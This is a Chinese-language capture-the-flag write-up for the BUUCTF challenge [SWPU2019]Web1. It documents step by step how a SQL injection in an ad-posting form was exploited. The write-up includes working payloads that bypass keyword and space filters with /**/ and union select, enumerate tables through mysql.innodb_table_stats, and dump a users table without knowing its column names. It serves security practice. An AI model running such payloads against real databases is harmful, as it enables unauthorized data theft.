日期：2026/5/16              题目：[SWPU2019]Web1                       平台：BUUCTF
攻击过程：
  第一步：进入页面，有登录注册界面，尝试sql注入，没有什么响应，感觉这里不是攻击点
  第二步：注册登录进入页面，有个“用户名：11”字样，怀疑有ssti或者xss，明显这个题目中xss没用，尝试ssti:{{1*3}},{1*4}之类的无用，说明大概没有ssti
  第三步：点击发布广告，连续发送两个一样的广告，会提示已经有了该广告，说明这里可能有sql，也确实如此，并且发现他过滤了or，and，#，--等字符
  第四步：使用group by查看有多少列，因为or被禁用，所以order by也被禁用。同时在这个网站，要使用/**/代替空格，
          查看多少列的代码：1'/**/group/**/by/**/22,' 
          最终确定为22列
  第五步：爆表，本想使用information_schema爆表，但是or被禁用information也被禁用了，所以使用mysql.innodb_table_stats：（数据库的名称可以直接用union select加database()爆破）
    1'union/**/select/**/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name='web1'&&'1'='1
        当然还有思路是使用prepare去拼接information，因为prepare没有过滤
        结果：（得到表名users和ads）
        <img width="1728" height="219" alt="image" src="https://github.com/user-attachments/assets/1425718e-5933-4966-86ab-674fe02d6183" />
  第六步：进一步得到users表的内容，因为information被禁用，所以只能使用别的方法。payload如下：
        a'/**/union/**/select/**/1,2,(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,
        6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&&'1=1
        
        解释：(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a，先是制作一个临时表a，这个表a是由users拼接来的，有着users的所有内容，为什么要2 as a，因为
                如果单独a，b之类的，数据库会用a和b匹配users的列名，发现没有a和b会报错
             select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a可以得到a表的第三列，猜测第三列是关键（可以一个一个试）
        结果：
        <img width="2028" height="316" alt="image" src="https://github.com/user-attachments/assets/fe084bdd-f0e1-44f0-a911-77740112a78a" />

            
        
  
